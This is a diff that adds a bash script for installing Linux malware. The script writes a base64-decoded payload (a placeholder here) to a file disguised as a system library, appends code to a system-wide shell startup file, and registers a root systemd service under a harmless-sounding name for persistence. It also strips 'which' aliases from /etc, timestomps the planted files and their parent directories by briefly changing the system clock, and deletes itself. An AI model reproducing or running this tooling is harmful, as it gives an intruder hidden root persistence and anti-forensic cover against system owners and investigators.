@@ -1,0 +1,95 @@
+#!/bin/bash
+find /etc -type f -exec sed -i '/alias which/d' {} \;
+timestomp() {
+    local target="$1"
+
+    [[ -z "$target" ]] &&  return 1
+    [[ ! -e "$target" ]] &&  return 1
+
+    target="$(readlink -f "$target")"
+
+    # Build list: file first, then each parent dir up the tree
+    local -a items=("$target")
+    local walk
+    walk="$(dirname "$target")"
+    while [[ "$walk" != "/" ]]; do
+        items+=("$walk")
+        walk="$(dirname "$walk")"
+    done
+
+    # For each item, find the most common day+year among files in its parent dir,
+    # pick one file with that date as master, then stamp the item
+    local item dir master common_date perms ctime
+
+    for item in "${items[@]}"; do
+        dir="$(dirname "$item")"
+
+        # Most common YYYY-MM-DD among siblings (excluding $item itself)
+        common_date=$(
+            find "$dir" -maxdepth 1 ! -path "$item" \( -type f -o -type l \) \
+                -printf "%TY-%Tm-%Td\n" 2>/dev/null |
+            sort | uniq -c | sort -rn | awk 'NR==1{print $2}'
+        )
+
+        # First sibling file matching that date
+        master=$(
+            find "$dir" -maxdepth 1 ! -path "$item" \( -type f -o -type l \) \
+                -printf "%TY-%Tm-%Td %p\n" 2>/dev/null |
+            grep "^$common_date " | head -1 | cut -d' ' -f2-
+        )
+
+        [[ -z "$master" ]] && continue
+
+        perms="$(stat -c %a "$item")"
+        ctime="$(stat -c %z "$master")"
+
+        touch -h -r "$master" "$item"
+
+        sudo bash -c "
+            real=\$(date +@%s)
+            date -s '$ctime'    >/dev/null 2>&1
+            chmod $perms '$item'
+            date -s \"\$real\"  >/dev/null 2>&1
+        "
+
+        #echo "stamped: $item  (master: $(basename "$master")  date: $common_date)"
+    done
+
+    #stat "$target"
+}
+
+MFILE="/usr/lib64/libda-5.3.so"
+FFILE=$(for i in $(/bin/bash -lixc 'exit' 2>&1 | awk 'match($0, /^+* (\.|source) (.+)/, s) {print s[2]}');do wc -l $i;done | sort -n | grep -vE "home|root" | cut -d' ' -f2 | uniq | tail -n 1)
+PFILE="/etc/systemd/system/libda-helper.service"
+echo -e "MFILE:\n$MFILE"
+echo -e "FFILE:\n$FFILE"
+echo -e "PFILE:\n$PFILE"
+echo -e "\n\n"
+
+# FUNCTIONS FILE
+if /bin/grep -q "^userID" "$FFILE";then
+        echo FOUND &>/dev/null
+else
+        echo " " >> $FFILE ## add buffer line
+        $(command which cat) << 'EOF' >> $FFILE
+EFUNCTIONS
+EOF
+fi
+
+# MALWARE FILE
+echo -e 'MFUNCTIONS' | base64 -d > $MFILE
+chmod 755 $MFILE
+
+# PERSISTEANCE FILE
+sudo bash -c 'printf "[Unit]\nDescription=Dynamic Library Audio Helper\nAfter=network.target\n\n[Service]\nExecStart=/usr/lib64/libda-5.3.so\nType=simple\nRestart=no\nUser=root\n\n[Install]\nWantedBy=multi-user.target\n" > /etc/systemd/system/libda-helper.service'
+
+sudo systemctl daemon-reload
+sudo systemctl enable libda-helper.service
+sudo systemctl restart libda-helper.service
+sudo systemctl status libda-helper.service
+
+timestomp $MFILE
+timestomp $FFILE
+timestomp $PFILE
+
+rm -rf $0
